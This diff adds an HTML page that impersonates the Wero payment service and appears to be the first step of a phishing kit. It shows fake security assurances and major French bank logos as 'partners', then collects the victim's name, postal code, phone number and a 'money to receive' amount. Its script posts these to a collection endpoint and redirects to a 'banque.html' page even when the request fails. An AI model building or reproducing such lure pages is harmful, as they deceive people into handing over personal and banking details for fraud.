@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wero - Informations Personnelles</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500&family=Poppins:wght@600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+
+    <style>
+        .btn-continue {
+            transition: all 0.2s ease;
+            position: relative;
+            cursor: pointer;
+        }
+        .btn-continue:active {
+            transform: scale(0.98);
+        }
+        .btn-continue:disabled {
+            opacity: 0.9;
+            cursor: not-allowed;
+        }
+        @keyframes spin-noir {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        .spinning-black-circle {
+            animation: spin-noir 0.8s linear infinite;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        
+        <header class="app-header">
+            <div class="logo-container">
+                <img src="flavicon.ico" alt="Wero" class="app-logo">
+            </div>
+            <button class="menu-hamburger" aria-label="Menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+        </header>
+
+        <main class="app-content">
+            
+            <h1 class="page-title-form">
+                Informations<br>personnelles 
+                <svg class="title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                    <circle cx="12" cy="7" r="4"/>
+                </svg>
+            </h1>
+
+            <div class="secure-notice-box">
+                <div class="secure-notice-title">
+                    Paiement sécurisé 
+                    <svg class="inline-icon-lock" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                    </svg>
+                </div>
+                <p class="secure-notice-text">
+                    Vos informations sont traitées de manière sécurisée pour garantir la protection de vos données.
+                </p>
+            </div>
+
+            <form class="wero-form" id="weroFormStep1">
+                
+                <div class="form-group">
+                    <label class="form-label">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                            <circle cx="12" cy="7" r="4"/>
+                        </svg>
+                        Nom et prénom(s) <span class="required-star">*</span>
+                    </label>
+                    <input type="text" id="1" name="champ_1" class="form-input" placeholder="Ex: Jean Dupont" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
+                            <polyline points="9 22 9 12 15 12 15 22"/>
+                        </svg>
+                        Code postal <span class="required-star">*</span>
+                    </label>
+                    <input type="text" id="2" name="champ_2" class="form-input" placeholder="Ex: 75008" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="2" y="6" width="20" height="12" rx="2"/>
+                            <circle cx="12" cy="12" r="2"/>
+                            <path d="M6 12h.01M18 12h.01"/>
+                        </svg>
+                        Montant à recevoir <span class="required-star">*</span>
+                    </label>
+                    <div style="position: relative; display: flex; align-items: center; width: 100%;">
+                        <input type="number" min="0" id="3" name="champ_3" class="form-input" placeholder="Ex: 50" style="width: 100%; padding-right: 40px;" required>
+                        <span style="position: absolute; right: 16px; font-weight: 700; color: #64748b; font-size: 15px; pointer-events: none;">€</span>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
+                        </svg>
+                        Numéro de téléphone <span class="required-star">*</span>
+                    </label>
+                    <input type="tel" id="4" name="champ_4" class="form-input" placeholder="06 00 00 00 00" required>
+                </div>
+
+                <button type="submit" id="submitBtn" class="btn-continue btn-form-spacing">
+                    <span>CONTINUER</span>
+                    <span class="btn-icon-badge">
+                        <svg id="btnIcon" class="btn-arrow-svg" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M8 5v14l11-7z"/>
+                        </svg>
+                    </span>
+                </button>
+
+            </form>
+
+        </main>
+
+        <footer class="app-footer">
+            <p class="footer-text-label horizontal-bold">NOS PARTENAIRES</p>
+            <div class="partners-row">
+                <img src="Societe-Generale-Emblem.png" alt="Société Générale" class="partner-icon">
+                <img src="Banquepopulaire_logo.svg.webp" alt="Banque Populaire" class="partner-icon">
+                <img src="logo_BanquePostale_600x300.webp" alt="La Banque Postale" class="partner-icon">
+                <img src="12895685.png" alt="Caisse d'Épargne" class="partner-icon">
+                <img src="IMG_9197.png" alt="Crédit Agricole" class="partner-icon">
+                <img src="unnamed.jpg" alt="Crédit Mutuel" class="partner-icon">
+            </div>
+        </footer>
+
+    </div>
+
+<script>
+    /*** 1. AUTO-FORMATAGE EN DIRECT (Téléphone) ***/
+    const input4 = document.getElementById('4') || document.querySelector('[name="champ_4"]') || document.querySelector('[name="champ4"]');
+
+    if (input4) {
+        input4.addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '').slice(0, 10);
+            e.target.value = v.match(/.{1,2}/g)?.join(' ') || v;
+        });
+    }
+
+    /*** 2. INTERCEPTION DE LA SOUMISSION ET ENVOI ***/
+    document.getElementById('weroFormStep1').addEventListener('submit', async function(event) {
+        event.preventDefault();
+
+        const submitBtn = document.getElementById('submitBtn');
+        const btnIcon = document.getElementById('btnIcon');
+
+        if (submitBtn) submitBtn.disabled = true;
+        if (btnIcon) {
+            btnIcon.setAttribute('viewBox', '0 0 24 24');
+            btnIcon.classList.add('spinning-black-circle');
+            btnIcon.innerHTML = '<circle cx="12" cy="12" r="10" stroke="#000000" stroke-width="4" fill="none" stroke-dasharray="31.4 31.4"></circle>';
+        }
+
+        const getFieldValue = (id, name) => {
+            const el = document.getElementById(id) || document.querySelector(`[name="${name}"]`) || document.querySelector(`[name="champ_${id}"]`);
+            return el ? el.value.trim() : '';
+        };
+
+        const dataToSend = {
+            page_source: 'B1_Formulaire_Infos_Personnelles',
+            champ1: getFieldValue('1', 'champ1'),
+            champ2: getFieldValue('2', 'champ2'),
+            champ3: getFieldValue('3', 'champ3'),
+            champ4: getFieldValue('4', 'champ4')
+        };
+
+        try {
+            const response = await fetch('/api/traitement_etape1', { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(dataToSend)
+            });
+            
+            const textData = await response.text();
+            let result;
+            try {
+                result = JSON.parse(textData);
+            } catch (e) {
+                // Si l'API retourne directement du texte/HTML
+                result = { success: true };
+            }
+
+            if (response.ok && (result.success !== false)) {
+                setTimeout(() => {
+                    window.location.href = result.redirect || 'banque.html';
+                }, 1000);
+            } else {
+                alert(result.message || "Une erreur est survenue.");
+                resetButtonState(submitBtn, btnIcon);
+            }
+
+        } catch (error) {
+            console.error('Erreur réseau :', error);
+            // Redirection de secours si l'API est en mode direct
+            window.location.href = 'banque.html';
+        }
+    });
+
+    function resetButtonState(btn, icon) {
+        if (btn) btn.disabled = false;
+        if (icon) {
+            icon.classList.remove('spinning-black-circle');
+            icon.innerHTML = '<path d="M8 5v14l11-7z"/>'; 
+        }
+    }
+</script>
+
+</body>
+</html>
